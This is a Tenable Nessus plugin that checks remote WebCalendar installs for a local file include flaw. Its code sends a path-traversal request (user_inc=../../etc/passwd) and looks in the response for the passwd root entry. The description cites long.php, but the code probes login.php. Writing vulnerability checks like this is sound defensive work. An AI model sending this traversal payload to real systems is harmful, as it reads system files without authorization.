#
# (C) Tenable Network Security
#

if(description)
{
 script_id(11794);
 script_bugtraq_id(8237);
 script_version ("$Revision: 1.7 $");
 
 name["english"] = "WebCalendar file reading";

 script_name(english:name["english"]);
 
 desc["english"] = "
Synopsis :

The remote web server has a PHP script that is affected by a local
file include flaw. 

Description :

The remote installation of WebCalendar may allow an attacker to read
arbitrary files on the remote host by supplying a filename to the
'user_inc' argument of the file 'long.php'. 

See also :

http://www.securityfocus.com/archive/1/329793
http://www.securityfocus.com/archive/1/330521/30/0/threaded
http://sourceforge.net/forum/forum.php?thread_id=901234&forum_id=11588

Solution : 

Upgrade to WebCalendar 0.9.42 or later.

Risk factor : 

Medium / CVSS Base Score : 4 
(AV:R/AC:L/Au:NR/C:P/A:N/I:N/B:C)";

 script_description(english:desc["english"]);
 
 summary["english"] = "Checks for file reading flaw in WebCalendar";
 
 script_summary(english:summary["english"]);
 
 script_category(ACT_ATTACK);
 
 
 script_copyright(english:"This script is Copyright (C) 2003 Tenable Network Security");
 family["english"] = "CGI abuses";
 family["francais"] = "Abus de CGI";
 script_family(english:family["english"], francais:family["francais"]);
 script_dependencies("webcalendar_detect.nasl");
 script_exclude_keys("Settings/disable_cgi_scanning");
 script_require_ports("Services/www", 80);
 exit(0);
}

#
# The script code starts here
#


include("http_func.inc");
include("http_keepalive.inc");

port = get_http_port(default:80);
if(!get_port_state(port))exit(0);
if(!can_host_php(port:port))exit(0);



# Test an install.
install = get_kb_item(string("www/", port, "/webcalendar"));
if (isnull(install)) exit(0);
matches = eregmatch(string:install, pattern:"^(.+) under (/.*)$");
if (!isnull(matches)) {
 dir = matches[2];

 req = http_get(item:string(dir, "/login.php?user_inc=../../../../../../../../../../../../../../../etc/passwd"),
 		port:port);
 res = http_keepalive_send_recv(port:port, data:req, bodyonly:TRUE);
 if( res == NULL )exit(0);
 if(egrep(pattern:"root:.*:0:[01]:.*:", string:res))
 {
 	security_warning(port);
	exit(0);
 }
}
